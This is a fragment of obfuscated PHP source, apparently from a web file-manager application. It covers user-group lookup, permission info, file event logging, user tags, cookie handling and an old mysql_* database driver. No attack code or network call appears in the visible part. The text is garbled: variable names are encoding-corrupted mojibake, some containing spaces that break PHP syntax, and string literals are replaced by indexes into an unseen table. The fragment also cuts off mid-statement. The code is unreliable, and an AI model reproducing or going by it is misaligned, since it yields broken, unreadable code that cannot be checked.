userGroupParents($É¸ ğ€ì) { $ùÓ¥ŠÏ =& $_SERVER[çâ¥×ø³]; static $–É‰Í‚î = array(); $É¸ ğ€ì = $É¸ ğ€ì ? $É¸ ğ€ì : USER_ID; if (isset($–É‰Í‚î[$É¸ ğ€ì])) { return $–É‰Í‚î[$É¸ ğ€ì]; } $ş¨âıƒØ = $this->userGroupList($É¸ ğ€ì); $ßËü•¼ = array(); $´æš¸× = $GLOBALS[$ùÓ¥ŠÏ[6]][$ùÓ¥ŠÏ[89]][$ùÓ¥ŠÏ[2002]] == 1; $…Û¯µ± = $´æš¸× ? 3 : 2; foreach ($ş¨âıƒØ as $â¥É±ó“) { $ÏåİÆú = array($â¥É±ó“[$ùÓ¥ŠÏ[1899]]); $¹« ó = explode($ùÓ¥ŠÏ[50], trim($â¥É±ó“[$ùÓ¥ŠÏ[553]], $ùÓ¥ŠÏ[50])); if ($¹« ó[0] == $ùÓ¥ŠÏ[212] && count($¹« ó) > $…Û¯µ±) { $—ÄÉ–» = array_slice($¹« ó, $…Û¯µ±); $ÏåİÆú = array_merge($ÏåİÆú, array_reverse($—ÄÉ–»)); } $ßËü•¼ = array_merge($ßËü•¼, $ÏåİÆú); } $–É‰Í‚î[$É¸ ğ€ì] = array_unique($ßËü•¼); return $–É‰Í‚î[$É¸ ğ€ì]; } public function authTargetInfoMake($Áµ’û²) { $áÖŞÇç =& $_SERVER[çâ¥×ø³]; $¬Åô¬Úõ = array(); $•Šä‘ÀÊ = array(); foreach ($Áµ’û² as $­·«…ò) { if ($­·«…ò[$áÖŞÇç[178]] == SourceModel::TYPE_USER) { $¬Åô¬Úõ[] = intval($­·«…ò[$áÖŞÇç[538]]); } else { if ($­·«…ò[$áÖŞÇç[178]] == SourceModel::TYPE_GROUP) { $•Šä‘ÀÊ[] = intval($­·«…ò[$áÖŞÇç[538]]); } } } if ($¬Åô¬Úõ) { $¬Åô¬Úõ = Model($áÖŞÇç[546])->userListInfo($¬Åô¬Úõ); } if ($•Šä‘ÀÊ) { $Õü¸¶ = array($áÖŞÇç[1987] => array($áÖŞÇç[460], $•Šä‘ÀÊ)); $•Šä‘ÀÊ = Model($áÖŞÇç[554])->field($áÖŞÇç[2115])->where($Õü¸¶)->select(); $•Šä‘ÀÊ = array_to_keyvalue($•Šä‘ÀÊ, $áÖŞÇç[1899]); } return array($áÖŞÇç[2116] => $¬Åô¬Úõ, $áÖŞÇç[2117] => $•Šä‘ÀÊ); } public function authInfo($¦¨ş¦¤Ó) { $µ¾Ğœ¯ =& $_SERVER[çâ¥×ø³]; if ($¦¨ş¦¤Ó[$µ¾Ğœ¯[2003]]) { $ûä¸ü‹Ô = Model($µ¾Ğœ¯[540])->listData($¦¨ş¦¤Ó[$µ¾Ğœ¯[2003]]); if (!$ûä¸ü‹Ô) { return !1; $¥¡ƒÎÏ½ = Model($µ¾Ğœ¯[540])->listData(); $£°†©¡ = array_filter_by_field($¥¡ƒÎÏ½, $µ¾Ğœ¯[455], $µ¾Ğœ¯[212]); return $£°†©¡; } $•óòÈÇÇ = array_field_key($ûä¸ü‹Ô, array($µ¾Ğœ¯[443], $µ¾Ğœ¯[32], $µ¾Ğœ¯[455], $µ¾Ğœ¯[1922], $µ¾Ğœ¯[1923])); $•óòÈÇÇ[$µ¾Ğœ¯[2118]] = $¦¨ş¦¤Ó; return $•óòÈÇÇ; } else { return array($µ¾Ğœ¯[461] => 0, $µ¾Ğœ¯[1905] => $¦¨ş¦¤Ó[$µ¾Ğœ¯[2063]], $µ¾Ğœ¯[462] => $µ¾Ğœ¯[12], $µ¾Ğœ¯[1922] => $µ¾Ğœ¯[2119]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\162\x63\145\137\145\x76\x65\156\x74"; protected $dataAuto = array(array("\x63\162\x65\141\x74\x65\124\x69\155\145", "\x74\x69\x6d\x65", "\x69\156\x73\145\x72\164", "\146\165\156\143\x74\x69\x6f\156"), array("\x64\x65\x73\143", '', "\151\x6e\x73\x65\x72\164\x2c\x75\x70\x64\141\x74\145\x2c\163\145\x6c\x65\x63\x74", "\152\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Ë¿ååÈ¥, $á¨‡Ã°Ì, $˜ªòí = '') { $õí¶‡°¿ =& $_SERVER[çâ¥×ø³]; if (!$this->eventSave) { return; } $œµä©¥Ö = Model($õí¶‡°¿[1385])->sourceInfo($Ë¿ååÈ¥); if (!$œµä©¥Ö) { return !1; } if ($this->isCacheEvent($œµä©¥Ö, $á¨‡Ã°Ì)) { return; } if ($˜ªòí && is_string($˜ªòí)) { $˜ªòí = array($õí¶‡°¿[1938] => $˜ªòí); } $Õ‡¨Ğ’ = defined($õí¶‡°¿[2120]) ? USER_ID : 0; $µ½ì×ì = array($õí¶‡°¿[459] => $Ë¿ååÈ¥, $õí¶‡°¿[2121] => $œµä©¥Ö[$õí¶‡°¿[180]], $õí¶‡°¿[2122] => $œµä©¥Ö[$õí¶‡°¿[32]], $õí¶‡°¿[551] => !empty($œµä©¥Ö[$õí¶‡°¿[551]]) ? $œµä©¥Ö[$õí¶‡°¿[551]] : $õí¶‡°¿[12], $õí¶‡°¿[1692] => $Õ‡¨Ğ’, $õí¶‡°¿[464] => $á¨‡Ã°Ì, $õí¶‡°¿[1694] => $˜ªòí); $this->addSystemLog($á¨‡Ã°Ì, $µ½ì×ì); unset($µ½ì×ì[$õí¶‡°¿[2122]], $µ½ì×ì[$õí¶‡°¿[551]]); return $this->add($µ½ì×ì); } private function addSystemLog($‡»òÆ«©, $­ËÏ¼¢¦) { $æ¬îŒÇ÷ =& $_SERVER[çâ¥×ø³]; if ($‡»òÆ«© == $æ¬îŒÇ÷[2123]) { $‡»òÆ«© = $­ËÏ¼¢¦[$æ¬îŒÇ÷[494]][$æ¬îŒÇ÷[2124]]; } else { if (in_array($‡»òÆ«©, array($æ¬îŒÇ÷[1879], $æ¬îŒÇ÷[2125]))) { $‡»òÆ«© = $­ËÏ¼¢¦[$æ¬îŒÇ÷[494]][$æ¬îŒÇ÷[803]]; } } $¦åçêŠ = array_merge($­ËÏ¼¢¦, array($æ¬îŒÇ÷[2126] => $­ËÏ¼¢¦[$æ¬îŒÇ÷[181]], $æ¬îŒÇ÷[2127] => $­ËÏ¼¢¦[$æ¬îŒÇ÷[2127]])); Hook::trigger($æ¬îŒÇ÷[2128], $æ¬îŒÇ÷[2129] . $‡»òÆ«©, $­ËÏ¼¢¦); Model($æ¬îŒÇ÷[1843])->addLog($æ¬îŒÇ÷[2129] . $‡»òÆ«©, $¦åçêŠ); } private function isCacheEvent($À—ŠÃÈµ, $”–Ğ•Ñ½) { if ($À—ŠÃÈµ[$_SERVER[çâ¥×ø³][178]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($×¤ô ã¦, $Ú©ÀèÕÊ) { $¡âÆ¥Ì¿ =& $_SERVER[çâ¥×ø³]; $‡Ï•ïµœ = Model($¡âÆ¥Ì¿[1385])->sourceInfo($×¤ô ã¦); $ßÈÎä¼ = array($¡âÆ¥Ì¿[2124] => $Ú©ÀèÕÊ, $¡âÆ¥Ì¿[32] => $‡Ï•ïµœ[$¡âÆ¥Ì¿[32]]); return $this->addEvent($×¤ô ã¦, $¡âÆ¥Ì¿[2123], $ßÈÎä¼); } public function eventFileEdit($ÖÖŸ®¤) { $şŸÚ°Ì‘ =& $_SERVER[çâ¥×ø³]; $Æª¯†§ = array($şŸÚ°Ì‘[2130] => $_SERVER[$şŸÚ°Ì‘[2131]], $şŸÚ°Ì‘[2132] => strtolower(ACTION)); if (isset($GLOBALS[$şŸÚ°Ì‘[7]][$şŸÚ°Ì‘[2133]])) { $Æª¯†§[$şŸÚ°Ì‘[2133]] = $şŸÚ°Ì‘[88]; } return $this->addEvent($ÖÖŸ®¤, $şŸÚ°Ì‘[1869], $Æª¯†§); } public function eventRecycle($±“àğ¥„, $”•àßÎÅ) { return $this->addEvent($±“àğ¥„, $_SERVER[çâ¥×ø³][2125], $”•àßÎÅ); } public function eventRemove($ŠÙ”ÛÏ) { $ÉŞÛà«± =& $_SERVER[çâ¥×ø³]; $ş¦˜²ò¨ = Model($ÉŞÛà«±[1385])->sourceInfo($ŠÙ”ÛÏ); $£¹•¦„´ = $ş¦˜²ò¨[$ÉŞÛà«±[32]]; return $this->addEvent($ş¦˜²ò¨[$ÉŞÛà«±[180]], $ÉŞÛà«±[1868], $£¹•¦„´); } public function eventShare($Áà¦²ö’, $ÂÆ‰¸ª³) { return $this->addEvent($Áà¦²ö’, $_SERVER[çâ¥×ø³][1879], $ÂÆ‰¸ª³); } public function eventMove($¯êºŠµ¶, $ÍÖÊñ­Â, $šš¼š¬ç) { $íÖÈ¥µÅ =& $_SERVER[çâ¥×ø³]; $¤ï™§¯ñ = Model($íÖÈ¥µÅ[1385]); $†î•›‚í = $¤ï™§¯ñ->sourceInfo($¯êºŠµ¶); $Èú¯Òç¿ = $¤ï™§¯ñ->sourceInfo($ÍÖÊñ­Â); $ˆ«’å­Ø = $¤ï™§¯ñ->sourceInfo($šš¼š¬ç); $¤¥Ô›ÇÃ = array($íÖÈ¥µÅ[1213] => $ÍÖÊñ­Â, $íÖÈ¥µÅ[2134] => $Èú¯Òç¿[$íÖÈ¥µÅ[32]], $íÖÈ¥µÅ[2111] => !empty($Èú¯Òç¿[$íÖÈ¥µÅ[551]]) ? $Èú¯Òç¿[$íÖÈ¥µÅ[551]] : $íÖÈ¥µÅ[12], $íÖÈ¥µÅ[1214] => $šš¼š¬ç, $íÖÈ¥µÅ[2135] => $ˆ«’å­Ø[$íÖÈ¥µÅ[32]], $íÖÈ¥µÅ[2136] => !empty($ˆ«’å­Ø[$íÖÈ¥µÅ[551]]) ? $ˆ«’å­Ø[$íÖÈ¥µÅ[551]] : $íÖÈ¥µÅ[12]); $this->addEvent($¯êºŠµ¶, $íÖÈ¥µÅ[588], $¤¥Ô›ÇÃ); $†î•›‚í = $¤ï™§¯ñ->sourceInfo($¯êºŠµ¶); $¤¥Ô›ÇÃ = array($íÖÈ¥µÅ[181] => $†î•›‚í[$íÖÈ¥µÅ[181]], $íÖÈ¥µÅ[32] => $†î•›‚í[$íÖÈ¥µÅ[32]]); $this->addEvent($ÍÖÊñ­Â, $íÖÈ¥µÅ[2137], $¤¥Ô›ÇÃ); } public function eventCopy($›ù Å’ƒ) { $this->eventCreate($›ù Å’ƒ, $_SERVER[çâ¥×ø³][586]); } public function eventRename($×ÛÑãè”, $ç‘’ûĞŸ, $ ş¹¼ÌÑ) { $äŠõ´ƒ =& $_SERVER[çâ¥×ø³]; $É¢„æšÎ = array($äŠõ´ƒ[1213] => $ç‘’ûĞŸ, $äŠõ´ƒ[1214] => $ ş¹¼ÌÑ); return $this->addEvent($×ÛÑãè”, $äŠõ´ƒ[1399], $É¢„æšÎ); } public function eventAddComment($üšİ£Öï, $£©ÈŸå) { return $this->addEvent($üšİ£Öï, $_SERVER[çâ¥×ø³][2138], $£©ÈŸå); } public function eventAddDesc($×‡ªƒ³¶, $äöëÊÓÎ) { return $this->addEvent($×‡ªƒ³¶, $_SERVER[çâ¥×ø³][2139], $äöëÊÓÎ); } public function listBySource($¿ÈÜ‰Ú¤) { $Øı›ñ¨¥ =& $_SERVER[çâ¥×ø³]; $™ÆàÆ = Model($Øı›ñ¨¥[1385])->sourceInfo($¿ÈÜ‰Ú¤); $şÀ©¬À = array($Øı›ñ¨¥[459] => $¿ÈÜ‰Ú¤); if ($™ÆàÆ[$Øı›ñ¨¥[453]] == $Øı›ñ¨¥[88]) { $ñºÊ«î = Model($Øı›ñ¨¥[1385])->listSearchChildren($¿ÈÜ‰Ú¤, 20000); $ñºÊ«î[] = $¿ÈÜ‰Ú¤ . $Øı›ñ¨¥[422]; $şÀ©¬À = array($Øı›ñ¨¥[181] => array($Øı›ñ¨¥[7], $ñºÊ«î)); } $¶õ™”äù = $this->where($şÀ©¬À)->order($Øı›ñ¨¥[2140])->selectPage(); if ($¶õ™”äù[$Øı›ñ¨¥[410]][$Øı›ñ¨¥[411]] == 0) { $¶õ™”äù[$Øı›ñ¨¥[410]][$Øı›ñ¨¥[411]] = 1; $¶õ™”äù[$Øı›ñ¨¥[413]] = array(array($Øı›ñ¨¥[459] => $¿ÈÜ‰Ú¤, $Øı›ñ¨¥[2121] => $™ÆàÆ[$Øı›ñ¨¥[180]], $Øı›ñ¨¥[1692] => $™ÆàÆ[$Øı›ñ¨¥[495]], $Øı›ñ¨¥[464] => $Øı›ñ¨¥[2141], $Øı›ñ¨¥[465] => $™ÆàÆ[$Øı›ñ¨¥[215]], $Øı›ñ¨¥[1694] => $Øı›ñ¨¥[12])); } return $this->eventListParse($¶õ™”äù, $¿ÈÜ‰Ú¤); } private function eventListParse($Ğƒ©Ä, $Ÿ¹„¨) { $ûÉ™Û¹Õ =& $_SERVER[çâ¥×ø³]; $§—Œ¼€â = $Ğƒ©Ä[$ûÉ™Û¹Õ[413]]; $–‹–‰ÉÁ = array_to_keyvalue($§—Œ¼€â, $ûÉ™Û¹Õ[12], $ûÉ™Û¹Õ[181]); $“’êˆ®Ğ = array_to_keyvalue($§—Œ¼€â, $ûÉ™Û¹Õ[12], $ûÉ™Û¹Õ[2127]); foreach ($§—Œ¼€â as $„Â·©º·) { $·§šì = $„Â·©º·[$ûÉ™Û¹Õ[494]]; if ($„Â·©º·[$ûÉ™Û¹Õ[33]] == $ûÉ™Û¹Õ[588] && isset($·§šì[$ûÉ™Û¹Õ[1213]])) { $–‹–‰ÉÁ[] = $·§šì[$ûÉ™Û¹Õ[1213]] . $ûÉ™Û¹Õ[12]; $–‹–‰ÉÁ[] = $·§šì[$ûÉ™Û¹Õ[1214]] . $ûÉ™Û¹Õ[12]; } if ($„Â·©º·[$ûÉ™Û¹Õ[33]] == $ûÉ™Û¹Õ[2137] && isset($·§šì[$ûÉ™Û¹Õ[181]])) { $–‹–‰ÉÁ[] = $·§šì[$ûÉ™Û¹Õ[181]] . $ûÉ™Û¹Õ[12]; } } $–‹–‰ÉÁ = array_merge($–‹–‰ÉÁ, $“’êˆ®Ğ, array($Ÿ¹„¨ . $ûÉ™Û¹Õ[12])); $–‹–‰ÉÁ = array_unique($–‹–‰ÉÁ); $©ı•…‘¬ = array_unique(array_to_keyvalue($§—Œ¼€â, $ûÉ™Û¹Õ[12], $ûÉ™Û¹Õ[1701])); $Å¡Øíú‚ = Model($ûÉ™Û¹Õ[567])->userListInfo($©ı•…‘¬); $—èå ßÆ = Model($ûÉ™Û¹Õ[874])->sourceListInfo($–‹–‰ÉÁ, !0); foreach ($§—Œ¼€â as &$„Â·©º·) { if ($„Â·©º·[$ûÉ™Û¹Õ[33]] == $ûÉ™Û¹Õ[588] && isset($„Â·©º·[$ûÉ™Û¹Õ[494]][$ûÉ™Û¹Õ[1213]])) { $„Â·©º·[$ûÉ™Û¹Õ[494]][$ûÉ™Û¹Õ[1213]] = $—èå ßÆ[$„Â·©º·[$ûÉ™Û¹Õ[494]][$ûÉ™Û¹Õ[1213]]]; $„Â·©º·[$ûÉ™Û¹Õ[494]][$ûÉ™Û¹Õ[1214]] = $—èå ßÆ[$„Â·©º·[$ûÉ™Û¹Õ[494]][$ûÉ™Û¹Õ[1214]]]; } if ($„Â·©º·[$ûÉ™Û¹Õ[33]] == $ûÉ™Û¹Õ[2137] && isset($„Â·©º·[$ûÉ™Û¹Õ[494]][$ûÉ™Û¹Õ[181]])) { $„Â·©º·[$ûÉ™Û¹Õ[494]][$ûÉ™Û¹Õ[181]] = $—èå ßÆ[$„Â·©º·[$ûÉ™Û¹Õ[494]][$ûÉ™Û¹Õ[181]]]; } $„Â·©º·[$ûÉ™Û¹Õ[87]] = $—èå ßÆ[$„Â·©º·[$ûÉ™Û¹Õ[181]]]; $„Â·©º·[$ûÉ™Û¹Õ[2142]] = $—èå ßÆ[$„Â·©º·[$ûÉ™Û¹Õ[2127]]]; if ($„Â·©º·[$ûÉ™Û¹Õ[33]] == $ûÉ™Û¹Õ[1868]) { $„Â·©º·[$ûÉ™Û¹Õ[2142]] = $„Â·©º·[$ûÉ™Û¹Õ[87]]; $„Â·©º·[$ûÉ™Û¹Õ[2127]] = $„Â·©º·[$ûÉ™Û¹Õ[2142]][$ûÉ™Û¹Õ[181]]; $„Â·©º·[$ûÉ™Û¹Õ[87]] = !1; $„Â·©º·[$ûÉ™Û¹Õ[181]] = $ûÉ™Û¹Õ[12]; } $„Â·©º·[$ûÉ™Û¹Õ[2071]] = $Å¡Øíú‚[$„Â·©º·[$ûÉ™Û¹Õ[1701]]]; } unset($„Â·©º·); $Ğƒ©Ä[$ûÉ™Û¹Õ[413]] = $§—Œ¼€â; return $Ğƒ©Ä; } public function removeBySource($åÉ­öœ) { $ôûœÒªÌ = array($_SERVER[çâ¥×ø³][459] => $åÉ­öœ); $this->where($ôûœÒªÌ)->remove(); } } goto cÔ»êØÒÒ¹; A÷®ìˆ†‡È: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\162\56\164\141\147\114\x69\163\x74"; public $modelType = "\x55\163\145\162\117\x70\x74\151\x6f\x6e"; public $field = array("\x6e\x61\x6d\145", "\x73\x74\x79\x6c\145", "\163\x6f\162\164"); public function listData($Ïò‡÷Øô = false, $íœİÊËÖ = "\163\157\162\x74", $âÊğãá = false) { return parent::listData($Ïò‡÷Øô, $íœİÊËÖ, $âÊğãá); } public function remove($“Â¤¶Îï) { return parent::remove($“Â¤¶Îï); } public function add($´ÔÌ±, $Ææ•Î©ñ = "\154\x61\142\x65\154\x2d\x67\x72\x65\x79\x2d\x6e\157\x72\x6d\x61\154") { $ßĞ¶Á‘³ =& $_SERVER[çâ¥×ø³]; if ($this->findByName($´ÔÌ±)) { return !1; } $¯¡ÊÓ‘ = array($ßĞ¶Á‘³[462] => $´ÔÌ±, $ßĞ¶Á‘³[526] => $Ææ•Î©ñ, $ßĞ¶Á‘³[1903] => $this->getSort($ßĞ¶Á‘³[302]) + 1); return parent::insert($¯¡ÊÓ‘); } public function update($øÇòµÑä, $ÚÚú¼) { $–¦º§· =& $_SERVER[çâ¥×ø³]; $µ÷­‹Ùå = $this->listData($øÇòµÑä); $Å¹ûÔï = $this->findByName($ÚÚú¼[$–¦º§·[32]]); if (!$µ÷­‹Ùå || $Å¹ûÔï && $Å¹ûÔï[$–¦º§·[443]] != $µ÷­‹Ùå[$–¦º§·[443]]) { return !1; } return parent::update($øÇòµÑä, $ÚÚú¼); } public function moveTop($œ”¦ˆÛ¿) { $ê¸Ù®ÎÈ =& $_SERVER[çâ¥×ø³]; $ƒâÌœ°ì = parent::listData(); $É›Ò‘ÒŒ = $this->getSort($ê¸Ù®ÎÈ[301]); foreach ($ƒâÌœ°ì as &$ÒËÄè) { if ($ÒËÄè[$ê¸Ù®ÎÈ[443]] == $œ”¦ˆÛ¿) { $ÒËÄè[$ê¸Ù®ÎÈ[1923]] = $É›Ò‘ÒŒ; continue; } $ÒËÄè[$ê¸Ù®ÎÈ[1923]] += 1; } unset($ÒËÄè); return parent::resetData($ƒâÌœ°ì); } public function moveBottom($òÎçÑ³¬) { $‚ÊäÍ¹ =& $_SERVER[çâ¥×ø³]; $ì°ßÔ‚˜ = $this->getSort($‚ÊäÍ¹[302]) + 1; return parent::update($òÎçÑ³¬, array($‚ÊäÍ¹[1923] => $ì°ßÔ‚˜)); } public function resetSort($ÛÂúİÚğ) { $¢õËŸÍ =& $_SERVER[çâ¥×ø³]; $ü¨ÉÁõÜ = array(); $ÛÂúİÚğ = is_array($ÛÂúİÚğ) ? $ÛÂúİÚğ : array(); for ($«û°¾Èß = 0; $«û°¾Èß < count($ÛÂúİÚğ); $«û°¾Èß++) { $ü¨ÉÁõÜ[$ÛÂúİÚğ[$«û°¾Èß] . $¢õËŸÍ[12]] = $«û°¾Èß + 1; } $µ“²òó½ = parent::listData(); foreach ($µ“²òó½ as &$àÇüëœË) { $¬¹Í¦˜» = $ü¨ÉÁõÜ[$àÇüëœË[$¢õËŸÍ[443]]]; $àÇüëœË[$¢õËŸÍ[1923]] = $¬¹Í¦˜» ? $¬¹Í¦˜» : $àÇüëœË[$¢õËŸÍ[1923]]; } unset($àÇüëœË); return parent::resetData($µ“²òó½); } private function getSort($¶Õ™ÏÌ) { $Áìî¿Ïã =& $_SERVER[çâ¥×ø³]; $×±áôş¢ = parent::listData(); $ªã¨Í€Ú = array_to_keyvalue($×±áôş¢, $Áìî¿Ïã[12], $Áìî¿Ïã[1923]); if (!$ªã¨Í€Ú) { $ªã¨Í€Ú = array(0); } $¹âÜå‡µ = $¶Õ™ÏÌ == $Áìî¿Ïã[302] ? max($ªã¨Í€Ú) : min($ªã¨Í€Ú); return intval($¹âÜå‡µ); } } goto E‹³†ª§Ó¥; d„°ÃŞâ†: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($»œ¯ºòø = '', $óéõÏ·Ø = 0) { if (is_string($»œ¯ºòø) && $»œ¯ºòø != $_SERVER[çâ¥×ø³][12]) { $this->prefix = $»œ¯ºòø; } if (is_numeric($óéõÏ·Ø) && $óéõÏ·Ø > 0) { $this->expire = $óéõÏ·Ø; } } public static function getInstance() { static $óí­„ß·; if ($óí­„ß· === null) { $óí­„ß· = new self(); } return $óí­„ß·; } private static $cookieDisable = false; public static function disable($…šúìØó) { self::$cookieDisable = $…šúìØó; } private static $sameCookieSet = array(); public static function set($úœÒåŒş, $¿ïš½ı, $ñ½‰¤² = 0, $»ùØûÌ† = false, $À³ÕÃ­¿ = false) { $ ÑÁı«µ =& $_SERVER[çâ¥×ø³]; if (self::$cookieDisable) { return; } if (!$ñ½‰¤²) { $ñ½‰¤² = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$úœÒåŒş]) && self::$sameCookieSet[$úœÒåŒş] == $¿ïš½ı . $ñ½‰¤²) { return; } self::$sameCookieSet[$úœÒåŒş] = $¿ïš½ı . $ñ½‰¤²; if (!$À³ÕÃ­¿) { $À³ÕÃ­¿ = str_replace(HOST, $ ÑÁı«µ[12], APP_HOST); $À³ÕÃ­¿ = _get($GLOBALS, $ ÑÁı«µ[935], $À³ÕÃ­¿); } $ãò§èè = $ ÑÁı«µ[12]; setcookie($úœÒåŒş, $¿ïš½ı, time() + $ñ½‰¤², $ ÑÁı«µ[8] . trim($À³ÕÃ­¿, $ ÑÁı«µ[8]) . $ãò§èè, !1, !1, $»ùØûÌ†); } public static function setSafe($³àÎñõŒ, $…Íá©Ñš, $¯¢‘„¨× = 0) { self::set($³àÎñõŒ, $…Íá©Ñš, $¯¢‘„¨×, !0); } public static function get($çŸû¿¾Û) { static $õê®âçÚ = false; if (!$õê®âçÚ) { self::initHeaderCookie(); $õê®âçÚ = !0; } return isset($_COOKIE[$çŸû¿¾Û]) ? $_COOKIE[$çŸû¿¾Û] : !1; } private static function initHeaderCookie() { $ıÒˆØø¤ =& $_SERVER[çâ¥×ø³]; if (!isset($_SERVER[$ıÒˆØø¤[936]]) || !$_SERVER[$ıÒˆØø¤[936]]) { return; } $Ö‡™ÓÕ = explode($ıÒˆØø¤[71], $_SERVER[$ıÒˆØø¤[936]]); foreach ($Ö‡™ÓÕ as $„Ê®ÅìÅ) { $„Ê®ÅìÅ = explode($ıÒˆØø¤[937], $„Ê®ÅìÅ); if (count($„Ê®ÅìÅ) != 2 || !isset($„Ê®ÅìÅ[1])) { continue; } $_COOKIE[trim($„Ê®ÅìÅ[0])] = trim($„Ê®ÅìÅ[1]); } } public static function remove($²‡ûüª€, $¸ôã±í = false) { unset($_COOKIE[$²‡ûüª€]); self::set($²‡ûüª€, $_SERVER[çâ¥×ø³][12], 1, $¸ôã±í); } } class DbMysql extends Db { public function __construct($ÖÆ–‰“ø = '') { $²˜¡±Ã« =& $_SERVER[çâ¥×ø³]; if (!extension_loaded($²˜¡±Ã«[853])) { think_exception(think_lang($²˜¡±Ã«[14]) . $²˜¡±Ã«[938]); } if (!empty($ÖÆ–‰“ø)) { $this->config = $ÖÆ–‰“ø; if (empty($this->config[$²˜¡±Ã«[17]])) { $this->config[$²˜¡±Ã«[17]] = $²˜¡±Ã«[12]; } } } public function connect($äç½ÎÅ‚ = '', $ô—îô¶È = 0, $ú›°ÅÛâ = false) { $ó¤Éæï‚ =& $_SERVER[çâ¥×ø³]; if (!isset($this->linkID[$ô—îô¶È])) { if (empty($äç½ÎÅ‚)) { $äç½ÎÅ‚ = $this->config; } $ÂÓ£ËÓ = $äç½ÎÅ‚[$ó¤Éæï‚[939]] . ($äç½ÎÅ‚[$ó¤Éæï‚[940]] ? "\x3a{$äç½ÎÅ‚[$ó¤Éæï‚[940]]}" : $ó¤Éæï‚[12]); $’äÎÆÌ = !empty($äç½ÎÅ‚[$ó¤Éæï‚[17]][$ó¤Éæï‚[18]]) ? $äç½ÎÅ‚[$ó¤Éæï‚[17]][$ó¤Éæï‚[18]] : $this->pconnect; if ($’äÎÆÌ) { $this->linkID[$ô—îô¶È] = mysql_pconnect($ÂÓ£ËÓ, $äç½ÎÅ‚[$ó¤Éæï‚[941]], $äç½ÎÅ‚[$ó¤Éæï‚[942]], 131072); } else { $this->linkID[$ô—îô¶È] = mysql_connect($ÂÓ£ËÓ, $äç½ÎÅ‚[$ó¤Éæï‚[941]], $äç½ÎÅ‚[$ó¤Éæï‚[942]], !0, 131072); } if (!$this->linkID[$ô—îô¶È] || !empty($äç½ÎÅ‚[$ó¤Éæï‚[21]]) && !mysql_select_db($äç½ÎÅ‚[$ó¤Éæï‚[21]], $this->linkID[$ô—îô¶È])) { think_exception(mysql_error()); } $æüõõœ = mysql_get_server_info($this->linkID[$ô—îô¶È]); mysql_query($ó¤Éæï‚[943] . think_config($ó¤Éæï‚[944]) . $ó¤Éæï‚[58], $this->linkID[$ô—îô¶È]); if ($æüõõœ > $ó¤Éæï‚[945]) { mysql_query($ó¤Éæï‚[946], $this->linkID[$ô—îô¶È]); } $this->connected = !0; if (1 != think_config($ó¤Éæï‚[22])) { unset($this->config); } } return $this->linkID[$ô—îô¶È]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($’—¹ÁåÁ) { $ÁÉúÀò =& $_SERVER[çâ¥×ø³]; if (0 === stripos($’—¹ÁåÁ, $ÁÉúÀò[308])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $’—¹ÁåÁ; if ($this->queryID) { $this->free(); } think_action_status($ÁÉúÀò[23], 1); think_status($ÁÉúÀò[24]); $this->queryID = mysql_query($’—¹ÁåÁ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ğ»ÈšĞ) { $„©ÙşŸ =& $_SERVER[çâ¥×ø³]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ğ»ÈšĞ; if ($this->queryID) { $this->free(); } think_action_status($„©ÙşŸ[25], 1); think_status($„©ÙşŸ[24]); $äñÏŒÛĞ = mysql_query($ğ»ÈšĞ, $this->_linkID); $this->debug(); if (!1 === $äñÏŒÛĞ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[çâ¥×ø³][947], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ü¢çÍ…æ = mysql_query($_SERVER[çâ¥×ø³][948], $this->_linkID); $this->transTimes = 0; if (!$ü¢çÍ…æ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $‰©¢Ë¬÷ = mysql_query($_SERVER[çâ¥×ø³][949], $this->_linkID); $this->transTimes = 0; if (!$‰©¢Ë¬÷) { $this->error(); return !1; } } return !0; } private function getAll() { $İ·ùÒ¥Ñ = array(); if ($this->numRows > 0) { while ($Í¥œ†æù = mysql_fetch_assoc($this->queryID)) { $İ·ùÒ¥Ñ[] = $Í¥œ†æù; } mysql_data_seek($this->queryID, 0); } return $İ·ùÒ¥Ñ; } public function getFields($”˜ÈÍ¯) { $‰ç€Ÿß” =& $_SERVER[çâ¥×ø³]; $‘–ñÚÄœ = $this->query($‰ç€Ÿß”[950] . $this->parseKey($”˜ÈÍ¯)); $÷ÀÂÚî³ = array(); if ($‘–ñÚÄœ) { foreach ($‘–ñÚÄœ as $©–§Ÿœƒ => $ˆã‚á™) { $÷ÀÂÚî³[$ˆã‚á™[$‰ç€Ÿß”[31]]] = array($‰ç€Ÿß”[32] => $ˆã‚á™[$‰ç€Ÿß”[31]], $‰ç€Ÿß”[33] => $ˆã‚á™[$‰ç€Ÿß”[34]], $‰ç€Ÿß”[35] => (bool) (strtoupper($ˆã‚á™[$‰ç€Ÿß”[36]]) === $‰ç€Ÿß”[951]), $‰ç€Ÿß”[37] => $ˆã‚á™[$‰ç€Ÿß”[38]], $‰ç€Ÿß”[39] => strtolower($ˆã‚á™[$‰ç€Ÿß”[40]]) == $‰ç€Ÿß”[41], $‰ç€Ÿß”[42] => strtolower($ˆã‚á™[$‰ç€Ÿß”[43]]) == $‰ç€Ÿß”[44]); } } return $÷ÀÂÚî³; } public function getTables($«ğæÑ†Ö = '') { $ŞæıÜû˜ =& $_SERVER[çâ¥×ø³]; if (!empty($«ğæÑ†Ö)) { $€Å»‰Ú = $ŞæıÜû˜[952] . $«ğæÑ†Ö . $ŞæıÜû˜[953]; } else { $€Å»‰Ú = $ŞæıÜû˜[954]; } $ò•ªÁ¿  = $this->query($€Å»‰Ú); 